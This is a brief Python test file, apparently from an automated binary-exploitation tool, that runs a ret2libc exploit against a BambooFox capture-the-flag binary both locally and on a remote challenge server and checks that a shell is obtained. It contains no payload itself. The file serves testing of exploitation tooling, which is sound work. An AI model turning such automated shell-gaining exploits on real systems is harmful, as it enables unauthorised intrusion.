from .. import *

BIN = "./tests/bamboofox/ret2libc"


@flaky(max_runs=3)
def test_ret2libc_local(exploit):
    state = exploit(BIN, process(BIN))
    state = turnkey.classic(state)
    have_shell(state.target)


@flaky(max_runs=3)
def test_ret2libc_remote(exploit):
    state = exploit(BIN, remote("bamboofox.cs.nctu.edu.tw", 11002))
    state = turnkey.classic(state)
    have_shell(state.target)